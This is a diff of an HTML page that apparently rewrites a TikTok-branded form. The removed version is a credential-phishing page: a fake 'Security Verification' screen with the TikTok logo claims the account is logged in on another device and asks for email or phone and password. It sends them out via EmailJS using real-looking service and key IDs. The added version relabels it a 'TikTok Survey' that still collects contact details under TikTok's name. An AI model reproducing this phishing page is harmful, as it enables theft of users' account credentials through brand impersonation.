@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TikTok Security verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>TikTok Survey</title>
 
-  <!-- EmailJS library -->
+  <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
   <style>
@@ -19,7 +19,6 @@
       margin: 0;
       padding: 10px;
     }
-
     .container {
       background: white;
       border-radius: 12px;
@@ -29,120 +28,70 @@
       box-shadow: 0 0 20px rgba(0,0,0,0.3);
       text-align: center;
     }
-
-    img {
-      width: 80px;
-      margin-bottom: 15px;
-    }
-
-    h2 {
-      margin: 10px 0;
-      font-size: 1.5em;
-    }
-
-    p {
-      font-size: 0.9em;
-      color: #555;
-    }
-
     input, textarea {
       width: 100%;
       padding: 12px;
       margin: 10px 0;
       border-radius: 8px;
       border: 1px solid #ccc;
-      box-sizing: border-box;
       font-size: 1em;
     }
-
     button {
       width: 100%;
       padding: 12px;
       background: #FE2C55;
       color: white;
-      font-weight: bold;
       border: none;
       border-radius: 8px;
       cursor: pointer;
       font-size: 1em;
     }
-
     #debug {
       margin-top: 10px;
-      font-size: 0.8em;
+      font-size: 0.85em;
       color: red;
+      text-align: left;
       max-height: 120px;
       overflow-y: auto;
-      text-align: left;
       word-wrap: break-word;
     }
-
   </style>
 </head>
 <body>
 
 <div class="container">
-  <!-- TikTok Logo -->
-  <img src="https://upload.wikimedia.org/wikipedia/en/thumb/6/69/TikTok_logo.svg/1200px-TikTok_logo.svg.png" alt="TikTok Logo">
-
-  <h2>TikTok Security Verification</h2>
-  <h3><i>we noticed your account is logged in on another Device please login to verify its your Device!!!</i></h3>
-  <p>Verify Its Your Account by loggin In It On This Device</p>
-
-  <form id="form">
+  <h2>TikTok Survey</h2>
+  <form id="survey-form">
     <input type="text" name="user_contact" placeholder="Email or Phone Number" required>
-    <input type="text" placeholder="input password" required></textarea>
+    <textarea name="user_feedback" placeholder="How do you enjoy TikTok?" required></textarea>
     <button type="submit">Submit</button>
   </form>
-
   <div id="debug"></div>
 </div>
 
 <script>
-  // Initialize EmailJS
-  emailjs.init("KrIsLS-FBr6QzICvy"); // your public key
+  // Initialize EmailJS with your public key
+  emailjs.init("YOUR_PUBLIC_KEY");
 
-  const form = document.getElementById("form");
-  const debugDiv = document.getElementById("debug");
+  const form = document.getElementById("survey-form");
+  const debugArea = document.getElementById("debug");
 
-  function logDebug(message) {
-    const time = new Date().toLocaleTimeString();
-    debugDiv.innerHTML += `[${time}] ${message}<br>`;
-    debugDiv.scrollTop = debugDiv.scrollHeight;
-  }
+  form.addEventListener("submit", function(event) {
+    event.preventDefault();
 
-  form.addEventListener("submit", function(e) {
-    e.preventDefault();
-    logDebug("Form submission started...");
+    debugArea.innerHTML = "Sending…";
 
-    try {
-      emailjs.sendForm(
-        "service_qgk7vit",
-        "template_as1f6xf",
-        this
-      ).then((response) => {
-        logDebug(`✅ Email sent successfully! Status: ${response.status}`);
-        alert("✅ Sent successfully!");
-        form.reset();
-      }).catch((error) => {
-        logDebug(`❌ EmailJS Error: ${JSON.stringify(error)}`);
-        alert("❌ Error sending response. Check debug below.");
-      });
-    } catch (err) {
-      logDebug(`💥 JS Exception: ${err.message}`);
-      alert("💥 JavaScript error occurred! Check debug below.");
-    }
+    emailjs.sendForm(
+      "YOUR_SERVICE_ID",
+      "YOUR_TEMPLATE_ID",
+      this
+    ).then(function(response) {
+      debugArea.innerHTML = "✅ Sent successfully!";
+      form.reset();
+    }, function(error) {
+      debugArea.innerHTML = "❌ Error sending form: " + JSON.stringify(error);
+    });
   });
-
-  // Global JS error catcher
-  window.onerror = function(message, source, lineno, colno, error) {
-    logDebug(`🌐 Global Error: ${message} at ${source}:${lineno}:${colno}`);
-  };
-
-  // Global promise rejection catcher
-  window.onunhandledrejection = function(event) {
-    logDebug(`🌐 Unhandled Promise Rejection: ${event.reason}`);
-  };
 </script>
 
 </body>
